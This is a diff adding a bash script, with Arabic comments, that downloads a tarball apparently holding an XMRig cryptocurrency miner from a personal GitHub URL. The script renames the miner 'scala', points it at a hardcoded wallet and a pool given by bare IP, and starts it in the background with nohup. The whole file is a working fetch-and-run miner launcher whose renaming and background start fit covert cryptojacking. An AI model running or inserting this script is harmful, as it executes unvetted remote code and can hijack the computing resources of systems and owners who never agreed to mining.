@@ -1,0 +1,19 @@
+#!/bin/bash
+
+# إعداد بيانات المحفظة والمعدّن
+WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
+WORKER="terra"
+POOL="152.53.121.6:443"
+
+# مجلد العمل
+mkdir -p $HOME/scala && cd $HOME/scala
+
+# تحميل النسخة الجاهزة من XMRig (Linux x64)
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
+
+# فك الضغط
+tar -xvf scala.tar.gz --strip=1
+rm scala.tar.gz
+
+# تشغيل المعدّن في الخلفية باستخدام nohup
+nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls > output.log 2>&1 &
